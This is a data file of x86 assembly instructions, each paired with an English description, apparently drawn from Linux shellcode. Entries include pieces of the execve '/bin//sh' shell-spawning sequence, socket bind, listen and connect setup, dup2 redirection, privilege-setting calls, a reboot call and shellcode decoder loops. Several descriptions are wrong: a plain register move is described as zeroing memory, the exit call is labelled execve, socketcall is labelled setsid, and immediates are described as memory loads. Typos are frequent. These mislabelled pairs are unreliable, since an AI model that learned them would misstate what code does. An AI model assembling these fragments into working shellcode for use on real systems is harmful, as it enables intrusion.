mov [ebp-4], edi	move edi into the local memory address ebp-4
mov [ebp+12], ecx	move ecx into the address [ebp+12]
mov [ebp+12], ecx	move the contents of ecx into the memory location specified by the operation [ebp+12]
mov [ebp+20], zero_reg	move the contents of zero_reg into the memory location specified by the operation [ebp+20]
mov [ebp+20], zero_reg	move zero_reg into the address [ebp+20]
mov [ebp+22], word ax	move the word at the address ax into [ebp+22]
mov [ebp+22], word ax	move the word in ax into the memory location specified by the operation [ebp+22]
mov [ebp+var_a], eax	move the contents of eax into address defined by ebp+var_a
mov [ebx + 6], dl	save dl content into the space memory at the adress ebx + 6
mov [ebx + 6], dl	move dl into the address [ebx + 6]
mov [ebx], 110	move 110 into the effective address saved in ebx
mov [ebx], 123	move 123 into the effective address saved in ebx
mov [ebx+0xe], dl	copy dl content into memory space at the address ebx + 0xe
mov [ebx+0xe], dl	move dl into the address [ebx+0xe]
mov [ebx+12], eax	move eax into ebx+12
mov [ebx+7], al	move al into ebx+7
mov [ebx+8], ebx	move ebx into ebx+8
mov [ecx], 25	move 25 decimal into the memory address ecx
mov [ecx+4], eax	zero out [ecx+4]
mov [ecx+4], eax	move eax into the address [ecx+4]
mov [edi], al	copy al content into edi register
mov [edi], al	move decoded byte to edi
mov [edi], al	move the contents of the al register into the edi register
mov [edi], al	move al into the address pointed by edi
mov [edi], al	move the contents of the al register into the address pointed by edi
mov [edi], al	move al into edi register
mov [esi], al	copy al content into esi
mov [esi], al	move the contents of the al register into the esi register
mov [esi], al	swap al value with next byte value in esi
mov [esi+13], al	move al into the address [esi+13]
mov [esi+22], al	move al into the address [esi+22]
mov [esi+34], al	move al into the address [esi+34]
mov [esi+35], esi	move esi into the address [esi+35]
mov [esi+39], ebx	move ebx into the address [esi+39]
mov [esi+43], ebx	move ebx into the address [esi+43]
mov [esi+47], eax	move eax into the address [esi+47]
mov [esi+eax], cl	move the contents of cl into the byte at memory address esi+eax
mov [esp + 1], cl	move cl into the address [esp + 1]
mov [esp+4], esp	move esp into the address [esp+4]
mov [esp+4],esp	sets esp as recv buffer
mov [esp+57], al	move al into the address [esp+57]
mov [esp+57],al \n mov [esp+58],ah \n mov [esp+59], ebx	save into esp register the syscall command ‘int 0x80 and jump back to _stage’
mov [esp+58], ah	move ah into the address [esp+58]
mov [esp+59], ebx	move ebx into the address [esp+59]
mov [var], ebx	move the contents of ebx into the 4 bytes at memory address var
mov [var1], eax	move the contents of eax into the 4 bytes at memory address var1
mov a_letter, al	move al into memory address a_letter
mov ah, 0x80	move 0x80 into ah
mov al, [byte_tbl+2]	move the effective address of byte_tbl+2 to al register
mov al, [esi]	trasfer esi content into al register
mov al, [esi]	move the contents of the esi register into the al register
mov al, 03h	move 03h into al
mov al, 03h \n int 80h	execute __nr_read syscall
mov al, 04h	move 04h into al
mov al, 04h \n int 80h	execute __nr_write syscall
mov al, 05h	move 05h into al
mov al, 05h \n int 80h	execute __nr_open syscall
mov al, 0x01	move 0x1 into lower byte of the eax register
mov al, 0x01	move 0x01 into al
mov al, 0x04	move 0x04 into al
mov al, 0x05	put the syscall 0x5 into the al register
mov al, 0x06	move 0x06 into al
mov al, 0x0a	move 0x0a into al
mov al, 0x0b	save execve command in al register
mov al, 0x0b	move the hexadecimal value 11 in al register
mov al, 0x0b	copy the execve syscall numebr in al regisster
mov al, 0x0b	move 0x0b into al
mov al, 0x1	move the code of syscall exit in al register
mov al, 0x1	load __nr_exit syscall number into al register
mov al, 0x1	move the value 0x1 into the al register
mov al, 0x1	move 0x1 into lower byte of the eax register
mov al, 0x1 \n mov bl, 0x1	save 0x1 into al and bl regsters
mov al, 0x1 \n mov bl, 0x1	push hexadecimal value 0x1 into al and bl registers
mov al, 0x1 \n mov bl, 0x1	save hexadecimal value 0x1 into al and bl register
mov al, 0x17	setuid = 0x17
mov al, 0x17	move 0x17 into al
mov al, 0x1f	set the offset bytes to point at the end of the program
mov al, 0x1f	move 0x1f into al
mov al, 0x2	load __nr_fork sycall into al register
mov al, 0x2	put the syscall 0x2 into the al register
mov al, 0x21	move 0x21 into al
mov al, 0x21 \n int 0x80	load __nr_access into al register and ping kernel
mov al, 0x27	load __nr_alarm into al register
mov al, 0x2e	save setgid = 0x2e into al register
mov al, 0x2e	move 0x2e into al
mov al, 0x3	copy the value 3 into al register
mov al, 0x3	load read syscall number into al register
mov al, 0x3	move 0x3 into al
mov al, 0x30	move 0x30 into al
mov al, 0x33	move 0x33 into al
mov al, 0x3b	load execve syscall into al register
mov al, 0x3f	load __nr_dup2 into al register
mov al, 0x3f	load sys_dup2 into al register
mov al, 0x3f	load sys call for dup2 into al register
mov al, 0x3f	move 0x3f into al
mov al, 0x3f	syscall 63
mov al, 0x3f \n int 0x80	execute sys_dup2
mov al, 0x3f \n int 0x80	load dup2 syscall into al register and execute
mov al, 0x4	move the value 0x4 into the al register
mov al, 0x4	move 0x4 into al
mov al, 0x42	move 0x42 into al
mov al, 0x46	load setreuid into al register
mov al, 0x46	move 0x46 into al
mov al, 0x5	trasfer 5 into al register
mov al, 0x5	load open syscall number into al register
mov al, 0x5	move the value 0x5 into the al register
mov al, 0x5	move 0x5 into al
mov al, 0x58	loading syscall value = 0x58 for reboot in al
mov al, 0x58	load the syscall value 0x58 for reboot in the al register
mov al, 0x6	load __nr_close syscall into al register
mov al, 0x6	move 0x6 into al
mov al, 0x6 \n int 0x80	close the stream file
mov al, 0x66	move the command socketcall in al register
mov al, 0x66	move the socketcall in al register
mov al, 0x66	put the syscall socketcall in al register
mov al, 0x66	move the command socketcall = 102 in al register
mov al, 0x66	load __nr_socketcall into al register
mov al, 0x66	load syscall sys_socket into al register
mov al, 0x66	load __nr_socketcall syscall into al register
mov al, 0x66	move socket call number to al register
mov al, 0x66	load setsid syscall into al register
mov al, 0x66	load socketcall sycall into al register
mov al, 0x66	make the socketcall
mov al, 0x66	make the systemcall socketcall
mov al, 0x66	move 0x66 into al
mov al, 0x66	syscall 102
mov al, 0x66	system call socketcall
mov al, 0x66 \n int 80h	execute setsid
mov al, 0x7	move 0x7 into al
mov al, 0x8	put the syscall 0x8 into the al register
mov al, 0xa2	move 0xa2 into al
mov al, 0xb	mov 11 into lower byte of eax
mov al, 0xb	put syscall execve code in al register
mov al, 0xb	load execve in eax
mov al, 0xb	set syscall execve
mov al, 0xb	load __nr_execve syscall number into al register
mov al, 0xb	load __nr_execve syscall into al regisetr
mov al, 0xb	load __nr_execve syscall into al register
mov al, 0xb	load __nr_execve into al register
mov al, 0xb	load the syscall 11 into al register
mov al, 0xb	load execve syscall nimber into al register
mov al, 0xb	execve system call number 11
mov al, 0xb	mov 0xb into lower byte of eax
mov al, 0xb	move 0xb into al
mov al, 0xb \n int 0x80	load __nr_execve into al register and ping kernel
mov al, 0xb \n int 0x80	load execve syscall number into al register and ping kernel
mov al, 0xb \n int 0x80	execute the file
mov al, 0xb \n int 0x80	execute sys_execve(11)
mov al, 0xb \n int 0x80	execute __nr_execve syscall
mov al, 0xb \n int 0x80	execute execve syscall
mov al, 0xb5	move 0xb5 into al
mov al, 0xcd	move 0xcd into al
mov al, 0xcd \n mov ah, 0x80	load int 0x80 into eax register
mov al, 0xf	move the function chmod in al register
mov al, 0xf	load chmod syscall number into al register
mov al, 0xf	move 0xf into al
mov al, 1	copy 1 in al
mov al, 1	move syscalll exit in a reegister
mov al, 1	move the number of the syscall exit in al register
mov al, 1	move the value 1 into the al register
mov al, 1	move 1 into al
mov al, 10	transfer the value 10 to the al register
mov al, 102	load the system call socketcall in al register
mov al, 102	load syscall for socketcall() 102 into al register
mov al, 102	make syscall for socketcall()
mov al, 102	load socketcall syscall number into al register
mov al, 102	load socketcall syscall into al register
mov al, 102	move 102 into al
mov al, 102 \n int 80h	execyte socketcall syscall
mov al, 11	insert execve code in al register
mov al, 11	put syscall execve code in al register
mov al, 11	load the execve syscall number into al register
mov al, 11	load syscall execve number into al register
mov al, 11	load the value 11 into al register
mov al, 11	make execve() syscall or 11
mov al, 11	save into al register execve system call
mov al, 11	put the syscall 11 into the al register
mov al, 11	move the value 11 into the al register
mov al, 11 \n int 0x80	call the execve syscall
mov al, 11 \n int 0x80	execute __nr_execve syscall
mov al, 11 \n int 0x80	execyte __nr_execve syscall
mov al, 11 \n int 0x80	execute execv syscall
mov al, 11 \n int 0x80	execute execve syscall
mov al, 11 \n push edx \n push 0x68732f6e \n push 0x69622f2f \n mov ebx,esp \n push edx \n push ebx \n mov ecx,esp \n int 0x80	execute shell using execve syscall
mov al, 12	move 12 into al
mov al, 15	move 15 into lower byte of the eax register
mov al, 16	move 16 into al
mov al, 2	move 2 into al
mov al, 2 \n int 80h	execute fork syscall
mov al, 20	move 20 into al
mov al, 23	move 23 into al
mov al, 37	move 37 into al
mov al, 39	move 39 into al
mov al, 4	move the number of the syscall write in al register
mov al, 4	store 4 into al
mov al, 4	move 4 into al
mov al, 5	load the code of syscall open in al register
mov al, 5	move 5 into al
mov al, 5 \n dec al \n jnz l2	move the value 5 into the al register then decrement the contents of the al register and jump to the l2 label if the result is not zero
mov al, 54	move 54 into al
mov al, 6	move the number of the syscall close in al register
mov al, 6	move 6 into al
mov al, 6 \n int 80h	execute close sycall
mov al, 61	move 61 into al
mov al, 63	load syscall for dup2()
mov al, 63	load into al register the syscall for dup2
mov al, 63	move the dup2 syscall into al register
mov al, 63	load dup2 syscall into al register
mov al, 63	save 63 into al
mov al, 63 \n int 0x80	move the code of syscall dup2 in al register and execute
mov al, 66h	move 66h into al
mov al, 70	move 70 into al
mov al, 72h	move 72h into al
mov al, 99	move 99 into al
mov al, a_letter	move data at memory location a_letter into al
mov al, byte [digits+eax]	move the effective address of digits+eax into al
mov al, byte [edi]	move the byte in edi into the al register
mov al, byte [edx+ecx]	move the effective address edx+ecx into al
mov al, byte [esi]	sabe shellcode lenght into al register
mov al, byte [esi]	move the byte at the address [esi] into al
mov al, byte [esi]	move the byte in esi into the al register
mov al, byte [esi]	move the byte in esi into al
mov al, byte [esi]	load the byte pointed by esi in al
mov al, byte [esi+1+ebp]	move the byte at the memory location specified by the operation [esi+1+ebp] into al
mov al, byte [esi+1+ebp]	put the byte at the address esi+1+ebp into al
mov al, byte [esi+ecx]	move a byte from the address esi+ecx into al
mov al, byte 0bh	move the byte 0bh into al
mov al, byte 0bh	move the byte at the address 0bh into al
mov al, byte 0x1	move the byte at the address 0x1 into al
mov al, byte 2ah	move the byte 2ah into al
mov al, byte 2ah	move the byte at the address 2ah into al
mov al, byte 2h	move the byte 2h into al
mov al, byte 2h	move the byte at the address 2h into al
mov al, byte 3fh	move the byte 3fh into al
mov al, byte 3fh	move the byte at the address 3fh into al
mov al, byte 3h	move the byte 3h into al
mov al, byte 3h	move the byte at the address 3h into al
mov al, byte 66h	move the byte 66h into al
mov al, byte 66h	move the byte at the address 66h into al
mov al, byte 6h	move the byte 6h into al
mov al, byte 6h	move the byte at the address 6h into al
mov al, byte[buff+ecx]	move a byte from the address buff+ecx into al
mov al, cl	move cl into al
mov al, cl	backup cl into al
mov al, close_syscall	move close_syscall into al
mov al, dl	move dl into al
mov al, dl	move dl to al
mov al, dl	copy the contents of dl into al
mov al, exit_call	load exit in al register
mov al, exit_call	move exit_call into al
mov al, write_syscall	move write_syscall into al
mov al,0x01	move 1 into lower byte of each
mov al,0x04	load the sys call to write the file
mov al,0x0b	copy execve syscall number into al register
mov al,0x1	put 1 in al register
mov al,0x1	load exit in al register
mov al,0x1	copy hexadecimal value 0x1 into al register
mov al,0x1	copy the code of the syscall exit into al reegister
mov al,0x1 \n add al,0xa	put syscall execve code in al register
mov al,0x3	copy the code of the syscall read into al register
mov al,0x33	load the code 0x33 of the syscall acct in al register
mov al,0x3f	load __nr_dup2 into al register
mov al,0x3f	load syscall duo2 into al register
mov al,0x4	put 4 in al regsiter
mov al,0x4	copy the code of the syscall write into al register
mov al,0x4	move the value 0x4 into al register
mov al,0x4	load __nr_write into al register
mov al,0x5	copy the code of syscall open to al register
mov al,0x5	copy the value 5 into al register
mov al,0x6	move syscall close in al register
mov al,0x6	copy close syscall number into al register
mov al,0x6	load __nr_close into al register
mov al,0x66	move the command socketcall in al register
mov al,0x66	copy socketcall syscall number into al register
mov al,0x66	load __nr_socketcall into al register
mov al,0x8	load __nr_creat syscall into al register
mov al,0x8 \n mov cl,077o	reate the file with 77 permission in octal
mov al,0xa2 \n int 0x80	execute nanosleep
mov al,0xa2 \n int 80h	execute nanosleep syscall
mov al,0xb	load execve in al register
mov al,0xb	put syscall execve code in al register
mov al,0xb	load execve syscall number into al register
mov al,0xb	set syscall execve
mov al,0xb	load __nr_execve syscall into al regisetr
mov al,0xb	load execve syscall number into al regsiter
mov al,0xb	load __nr_execve on stack
mov al,0xb	load __nr_execve syscall into al register
mov al,0xb \n int 0x80	execute execve syscall
mov al,0xf	load __nr_chmod into al register
mov al,0xf	load chmod syscall into al register
mov al,1 \n int 80h	execute execve syscall
mov al,102	load __nr_socketcall syscall into al register
mov al,11	load execve syscall into al register
mov al,11 \n int 0x80	execute __nr_execve syscall
mov al,11 \n int 0x80	execute execves yscall
mov al,11 \n int 0x80	execute execve syscall
mov al,2	load __nr_fork into al regsiter
mov al,63	load dup2 syscall into al register
mov al,63 \n int 80h	load dup2 syscall into al register and call kernel
mov al,byte 0x1	coy the byte 1 into al register
mov al,byte ptr [edi]	access memory at the adress edi and copy the byte into al register
mov al,close_syscall	move the value close_syscall to al register
mov al,write_syscall	move the value write_syscall to al register
mov ax, [1000h]	load the object at the address 1000h into the ax register
mov ax, [di]	copy thevalue at memory address specified by di into ax
mov ax, [esi]	move current word from encoded_shellcode to ax
mov ax, [esi]	move the contents at the address pointed by esi into the ax register
mov ax, [esi]	move the contents at the address stored in esi into the ax register
mov ax, [esi]	store the contents at the address pointed by esi into the ax register
mov ax, [my_var]	copy my_var contents in ax
mov ax, 00	initialize ax to 00
mov ax, 010ch	move value of 0x010ch into the register ax
mov ax, 0x167	insert in ax register the syscall _nr_socket /socket syscall number
mov ax, 0x167	load _nr_socket into ax regsiter
mov ax, 0x167	move 0x167 into ax
mov ax, 0x169	move bind syscall number in ax register
mov ax, 0x169	move 0x169 into ax
mov ax, 0x16a	insert in ax register the value 0x16a/connect syscall number
mov ax, 0x16a	insert in ax register the connect syscall number
mov ax, 0x16a	move 0x16a into ax
mov ax, 0x16b	load listen syscall numebr into ax register
mov ax, 0x16b	move 0x16b into ax
mov ax, 0x16c	load accept syscall number into ax register
mov ax, 0x16c	move 0x16c into ax
mov ax, 1	move value of 1 into register ax
mov ax, 102	moves syscall for socketcall into ax
mov ax, 102	move 102 into ax
mov ax, 1666	move 1666 into ax
mov ax, 45h	transfer the immediate constant 45h to ax
mov ax, 8h	move 8h into ax
mov ax, 9	get 9 in the ax
mov ax, bx	move bx into ax
mov ax, bx	move the contents of bx into ax
mov ax, table[esi*4]	move the memory offset table+esi*4 into ax
mov ax, word [edi + 1 + ecx]	mov the word at the address edi+1+ecx into ax
mov ax,[esi]	copy esi content into ax register
mov bh, 0x12	move 0x12 into bh
mov bh, 0xe2	move 0xe2 into bh
mov bh, bl	move the contents of bl into bh
mov bh, byte [esi + edx + 2]	save the byte in esi+edx+2 in bh
mov bh,0xcc	copy hexadecimal value from 0xcc to bh register
mov bl, [esi]	move the current byte of the shellcode to the bl
mov bl, [esi+ecx]	move the contents of memory address esi+ecx into bl
mov bl, 0bh	move 0bh into bl
mov bl, 0x01	move the syscall sys_socket in bl register
mov bl, 0x01	move 0x01 into bl
mov bl, 0x02	move the syscall bind in bl register
mov bl, 0x02	move 0x02 into bl
mov bl, 0x03	move the syscall sys_connect in bl register
mov bl, 0x04	move the syscall sys_listen in bl register
mov bl, 0x04	move 0x04 into bl
mov bl, 0x05	move the syscall sys_accept in bl register
mov bl, 0x1	put the 1 in bl register
mov bl, 0x1	move the syscall sys_socket in bl register
mov bl, 0x1	load 0x1 ino bl register
mov bl, 0x1	load hexadecimal vlaue 0x1 into bl register
mov bl, 0x1	move 1 into bl register
mov bl, 0x1	save socket =1 into bl register
mov bl, 0x1	move 0x1 to bl register
mov bl, 0x1	setting the socketcall type to sys_socket
mov bl, 0x1	move the value 0x1 into the bl register
mov bl, 0x1	move 0x1 into bl
mov bl, 0x1 \n mov al, 0x4 \n int 0x80	load 1 into bl register and write syscall number into al register, then call kernel
mov bl, 0x14	moves the sys_setsocketopt as param 1
mov bl, 0x14	move 0x14 into bl
mov bl, 0x2	put 2 in bl register
mov bl, 0x2	load in bl register the argument sys_bind = 2
mov bl, 0x2	copy the value sys_bind =2 on stack
mov bl, 0x2	set bind =2
mov bl, 0x2	set the socketcall type to sys_bind
mov bl, 0x2	move 0x2 into bl
mov bl, 0x2	move the value 0x2 into the bl register
mov bl, 0x3	copy 3 in bl register
mov bl, 0x3	push 0x3 into bl register
mov bl, 0x3	move 0x3 into bl
mov bl, 0x4	put 4 in bl register
mov bl, 0x4	move 0x4 hexadecimal value into bl register
mov bl, 0x4	copy the value of sys_listen=4 into bl register
mov bl, 0x4	set listen = 4
mov bl, 0x4	set the socketcall type to sys_listen
mov bl, 0x4	move the value 0x4 onto the stack
mov bl, 0x4	move 0x4 into bl
mov bl, 0x5	put 5 in bl register
mov bl, 0x5	load the value of sys_accept=5 on stack
mov bl, 0x5	copy 0x5 into bl register
mov bl, 0x5	accept =5
mov bl, 0x5	set the socketcall type to sys_accept
mov bl, 0x5	move 0x5 into bl
mov bl, 0x5	move the value 0x5 into the bl register
mov bl, 0x7	move 0x7 to bl
mov bl, 0x7	move 0x7 into bl
mov bl, 0x8	move the exadecimal value 0x8 into bl register
mov bl, 0x8	move 0x8 into bl
mov bl, 0x9	transfer the hexadecimal value 0x9 into bl register
mov bl, 0x9	move 0x9 into bl
mov bl, 0xe	save the value of sys_setcockopt = 14 into bl register
mov bl, 0xe	move 0xe into bl
mov bl, 0xff	store 0xff into bl register
mov bl, 0xff	move 0xff into bl
mov bl, 0xff	move the value 0xff into bl
mov bl, 0xff \n mov bh, 0xe2	load ‘jmp edx’ command into ebx register
mov bl, 1	load socket = 1 into bl register
mov bl, 1	move 1 into bl
mov bl, 10	store 10 into bl register
mov bl, 10	move 10 into bl
mov bl, 2	save the byte 2 into al register
mov bl, 2	move 2 into bl
mov bl, 3	connect
mov bl, 3	move 3 into bl
mov bl, 3 \n dec bl \n jnz l3	move the value 3 into the bl register then decrement the contents of the bl register and jump to the l3 label if the result is not zero
mov bl, 4	mov (4 = sys_listen = listen()) into bl
mov bl, 4	copy 4 into bl register
mov bl, 4	load listen = 4 into bl register
mov bl, 4	move 4 into bl
mov bl, 5	load 5 into bl register
mov bl, 5	load accept = 5 into bl register
mov bl, 5	store 5 into bl
mov bl, al \n sub bl, 2 \n jnz loop	move the contents of the al register into the contents of the bl register then subtract the value 2 from the cl register and jump to the loop label if the result is not zero
mov bl, byte [digits+ebx]	move the byte at address digits+ebx into bl
mov bl, byte [eax]	move the byte at the address [eax] into bl
mov bl, byte [eax]	move the byte in eax to bl
mov bl, byte [eax]	move the byte in eax into bl
mov bl, byte [edi + ecx]	move the byte at the address edi+ecx into bl
mov bl, byte [edi]	move the byte in edi into bl
mov bl, byte [edi]	move the byte at the address [edi] into bl
mov bl, byte [edi]	get the byte from edi and save it in bl
mov bl, byte [esi + eax + 1]	copy the byte in memory at the address [esi + eax + 1] in bl register
mov bl, byte [esi + eax + 1]	move the byte starting at the address [esi + eax + 1] into the bl register
mov bl, byte [esi + eax + 1]	move the byte at the address esi + eax +1 into bl
mov bl, byte [esi + eax + 1] \n mov byte [edi], bl	put the byte in the address esi+eax+1 to the first character pointed by edi.
mov bl, byte [esi + eax]	copy the byte in memory at the address [esi+eax] in bl register
mov bl, byte [esi + eax]	move the byte at the address esi + eax into bl
mov bl, byte [esi + edi]	move the byte at the address esi+edi into bl
mov bl, byte [esi + edx + 1]	save the byte in esi+edx+1 in bl
mov bl, byte [esi]	move the byte in esi into bl
mov bl, byte [esi]	move the byte at the address [esi] into bl
mov bl, byte [esi]	get the byte from esi and save it in bl
mov bl, byte [esi+eax*1]	move the byte at the address esi+eax*1 into bl
mov bl, byte [esi+eax*1+0x1] \n mov byte [edi], bl	move the byte at the address esi+eax*1+0x1 into bl and move bl into the byte in edi
mov bl, byte [esi+ecx+1]	copy the byte in memory at the address esi+ecx+1 into bl register
mov bl, byte [esi+ecx+1]	move the byte at the address [esi+ecx+1] into bl
mov bl, byte [esi+ecx+1]	move the byte in esi+ecx+1 into bl
mov bl, byte [esi+ecx+1] \n sub bl, 0x7	move the byte at the address in [esi+ecx+1] in bl and subtract 0x7 from bl
mov bl, byte 0eh	move the byte 0eh into bl
mov bl, byte 0eh	move the byte at the address 0eh into bl
mov bl, byte[edi]	copy the byte contained into edi register in bl register
mov bl, byte[esi]	transfer the byte in the address esi to bl regsiter
mov bl, cl	backup the contents of cl into bl
mov bl, cl	move cl into bl
mov bl, dl	move dl into bl
mov bl,0x1	copy the value 1 into bl register
mov bl,0x1	move the value 0x1 content into bl register
mov bl,0x2	copy 0x2 into bl register
mov bl,0x3	load 0x3 into bl register
mov bl,0x4	copy 0x4 into bl register
mov bl,1	load 1 into al register
mov bl,1	save socket command, 1, into bl register
mov bl,byte ptr [esi+eax*1]	copy the byte at the adress esi+eax*1 into bl register
mov bl,byte ptr [esi+eax*1+0x1] \n mov byte ptr [edi],bl	copy the byte at the adress esi+eax*1+0x1 into the byte at the adress edi
mov bl,dl	copy the dl content into bl register
mov bx, [esi]	copy esi content into bx register
mov bx, [esi]	move the contents of the address stored in esi into the bx register
mov bx, [esi]	move the contents of the esi register into the bx register
mov bx, 1666	move 1666 into bx
mov bx, 18	get 18 in the bx register
mov bx, 20	move the value 20 into bx
mov bx, word_value	move memory word_value to register bx
mov byte [eax], dl	move dl into the byte in eax
mov byte [eax], dl	move dl to the byte pointed by the contents of eax
mov byte [eax], dl	move dl into the byte at address [eax]
mov byte [ebx + 35], al	move al into the byte at address [ebx + 35]
mov byte [ebx + 35],al	copy al content into memory space at the adress ebx+35
mov byte [ebx + 35],al	save al content into the space memory at the address ebx+35
mov byte [ebx], 2	move 2 into the single byte at the address stored in ebx
mov byte [ecx], 2	move 2 into the single byte at memory location ecx
mov byte [ecx+92], dl	move dl into the byte at address [ecx+92]
mov byte [ecx+92], dl	move dl into the single byte at the address stored in ecx+92
mov byte [ecx+92],dl	replace r char with 0x0a
mov byte [edi], bl	copy the byte contained in bl register to the memory adress edi
mov byte [edi], bl	move the the contents of the bl register into the byte starting at the address in edi
mov byte [edi], bl	put the value of bl to the position of edi
mov byte [edi], bl	move bl into the byte in edi
mov byte [edi], bl \n not byte [edi]	move bl into the byte in edi and negate the result
mov byte [edi], bl \n xor byte [edi], 0xdd	move bl into the byte in edi and perform xor operation with 0xdd
mov byte [edx + eax], bl	move bl into the byte at address [edx + eax]
mov byte [edx + eax], bl	move bl into the byte at the address edx + eax
mov byte [edx + eax], bl	move bl into the byte in edx + eax
mov byte [edx+eax], bl	move bl into byte edx+eax
mov byte [edx+ecx],al	move al into the single byte at the address stored in edx+ecx
mov byte [esi + 1], dl	move the contents of dl into the byte at the memory location specified by the operation [esi+1]
mov byte [esi + 1], dl	move dl into the byte in esi+1
mov byte [esi + 1], dl	move dl into the byte at address [esi + 1]
mov byte [esi + eax], bl	move bl into the byte defined by the address esi + eax
mov byte [esi], al	move al into the byte in esi
mov byte [esi], bl	transfer decode value from bl to esi register
mov byte [esi], bl	move bl into the byte at address [esi]
mov byte [esi], dl	move dl into the byte in esi
mov byte [esi+10], al	move al into the byte at address [esi+10]
mov byte [esi+11], al	move al into the byte at address [esi+11]
mov byte [esi+12], al	move al into the byte at address [esi+12]
mov byte [esi+14], al	move al into the byte at address [esi+14]
mov byte [esi+14],al	move the contents of al into the byte at the memory location specified by the operation [esi+14]
mov byte [esi+17], al	move al into the byte at address [esi+17]
mov byte [esi+17],al	move the contents of al into the byte at the memory location specified by the operation [esi+17]
mov byte [esi+21], al	move al into the byte at address [esi+21]
mov byte [esi+7], al	terminate string, str[7] = null
mov byte [esi+7], al	move al into the byte at address [esi+7]
mov byte [esi+ecx], bl	copy bl content into the byte at the adress esi+ecx
mov byte [esi+ecx], bl	move bl into the byte at address [esi+ecx]
mov byte [esi+ecx], bl	move bl into the single byte at the address stored in esi+ecx
mov byte [esi+ecx], bl	move bl into the byte in esi+ecx
mov byte [esp + eax + 1], cl	move cl into the byte in esp+eax+1
mov byte [esp + eax + 2], bh	move bh into the byte in esp+eax+2
mov byte [esp + eax + 3], bl	move bl into the byte in esp+eax+3
mov byte [esp + eax], ch	move ch into the byte in esp+eax
mov byte [esp], 0x0a	move 0x0a into the byte at address [esp]
mov byte [esp], 0x2e	move 0x2e into the byte at address [esp]
mov byte [esp], 0x2e	move 0x2e into the byte in esp
mov byte [esp], 0x2f	move 0x2f into the byte at address [esp]
mov byte [esp], 0x2f	move 0x2f into the byte in esp
mov byte [esp], 0x7f	move 0x7f into the byte at address [esp]
mov byte [esp], 0x7f \n mov byte [esp+3],0x01	move ip address 127.0.0.1 into esp register
mov byte [esp+2], 0x07	move 0x07 into the byte at address [esp+2]
mov byte [esp+3], 0x01	move 0x01 into the byte at address [esp+3]
mov byte [esp+3], 0x11	move 0x11 into the byte at address [esp+3]
mov byte [hexstr+edx+1],bl	move a byte from bl into memory address hexstr+edx+1
mov byte [hexstr+edx+2],al	move a byte from al into memory address hexstr+edx+2
mov byte [var], 5	store the value 5 into the byte at memory location var
mov byte al, 0x0b	load __nr_ execve = 0x0b into al register as a byte
mov byte al, 0x0b	move 0x0b into the byte at address al
mov byte al, 0x3f	move 0x3f into the byte at address al
mov byte al, 0x3f	move 0x3f into the byte in al
mov byte al, 0xa4	setresuid syscall 164 (0xa4)
mov byte al, 0xa4	move 0xa4 into the byte at address al
mov byte al, 0xa4	move 0xa4 into the byte in al
mov byte al, 11	move 11 into the byte at address al
mov byte al, 83	move 83 into the byte at address al
mov byte cl, 7	set counter to 7 and save it in cl register
mov byte cl, 7	move 7 into the byte at address cl
mov byte ptr [esi+0xb],bl	copy the byte in bl register to the spae in memory at the address esi+0xb
mov byte[edx + eax], bl	copy bl contents in the byte at the address edx+eax
mov ch, 0x4	copy the value 0x4 into ecx
mov ch, 0x4	move 0x4 into ch
mov ch, byte [esi + edx + 4]	save the byte in esi+edx+4 in ch
mov ch,0x4	copy the hexadecimal value 0x4 in ch register
mov ch,0x5	move hexadecimal value 0x5 to ch register
mov cl, 0102	move 0102 into cl
mov cl, 077o	move 077o into cl
mov cl, 0x1	load 1 into cl regisetr
mov cl, 0x1	set cl to the fd of stdout = 1
mov cl, 0x1	move 0x1 into cl
mov cl, 0x1e	move 0x1e into cl
mov cl, 0x2	move 2 in cl regsiter
mov cl, 0x2	creat a countre moving the value 2 into cl register
mov cl, 0x2	push 2 into cl register
mov cl, 0x2	copy 0x2 into cl register
mov cl, 0x2	initiate the loop-counter to 2
mov cl, 0x2	load the value 0x2 into cl register
mov cl, 0x2	set cl to the stderr fd = 2
mov cl, 0x2	move 0x2 into cl
mov cl, 0x2	move the value 0x2 into the cl register
mov cl, 0x3	copy 3 into cl register
mov cl, 0x3	move 0x3 into cl
mov cl, 10	move 10 into the first byte of the counter
mov cl, 10 \n dec cl \n jnz l1	move the value 10 into the cl register then decrement the contents of the cl register and jump to the l1 label if the result is not zero
mov cl, 100	move 100 into cl
mov cl, 128	move 128 into cl
mov cl, 13	load the value 13 on cl register
mov cl, 13	move 13 to cl
mov cl, 13	move 13 into cl
mov cl, 2	copy 2 into cl register
mov cl, 2	inizialize counter ecx=2
mov cl, 2	move 2 into cl
mov cl, 21	copy 21 into cl register
mov cl, 21	move 21 into cl
mov cl, 25	transfer the decimal value 25 in cl register
mov cl, 3	counter to loop 3 times
mov cl, 3	move 3 into cl
mov cl, 30	move 30 into cl
mov cl, 30	move 30 to the cl register
mov cl, 32	move 32 into cl
mov cl, 4	transfer 4 into cl
mov cl, 4	move 4 value into cl register that represents the counter
mov cl, 4	loop 4 times
mov cl, 9	move 9 into cl
mov cl, al	move al into cl
mov cl, al	put the contents of the al into the cl register
mov cl, al	backup al into cl
mov cl, bl \n sub cl, 1 \n jnz loop	move the contents of the bl register into the contents of the cl register then subtract the value 1 from the cl register and jump to the loop label if the result is not zero
mov cl, byte [eax]	move the byte in eax into cl
mov cl, byte [eax]	move the byte in eax to cl
mov cl, byte [eax]	move the byte at the address [eax] into cl
mov cl, byte [esi + edx + 3]	save the byte in esi+edx+3 in cl
mov cl, byte [esi]	move the byte at the address [esi] into cl
mov cl, byte [esi]	move the byte in esi into cl
mov cl, byte_table[2]	move the 3rd element of the array byte_table into cl
mov cl, byte_table+2	move the 3rd element of the byte_table into cl
mov cl, dl	move dl into cl
mov cl, len	initialize counter cl to shellcode lenght
mov cl, len	move len into cl
mov cl, shellcode_length	save shellcode_lenght = 25 into cl register
mov cl, shellcode_length	move shellcode_length into cl
mov cl, shellcodelen	set the loop counter to shellcodelen into cl register
mov cl, shellcodelen	move shellcodelen into cl
mov cl,0x19	copy hexadecimal value 0x19 to cl register
mov cl,0x19	copy hexadeciaml value 0x19 into cl register
mov cl,0x2	move the value 2 into cl register
mov cl,0x2	load hexadecimal value 0x2 into cl register
mov cl,0x3	move the value 0x3 in cl register
mov count, bx	move bx to count
mov cx, [esi]	move the contents of the esi register into the cx register
mov cx, 01	initialize cx to 01
mov cx, 02001	move 02001 into cx
mov cx, 0666	move 0666 into cx
mov cx, 0700	move 0700 into cx
mov cx, 0x191	move 0x191 into cx
mov cx, 0x1ff	store hexadecimal value of ‘777’ in cx
mov cx, 0x1ff	load hexadecimal value 0x1ff into cx register
mov cx, 0x1ff	move 0x1ff into cx
mov cx, 0x2bc	move 0x2bc into cx
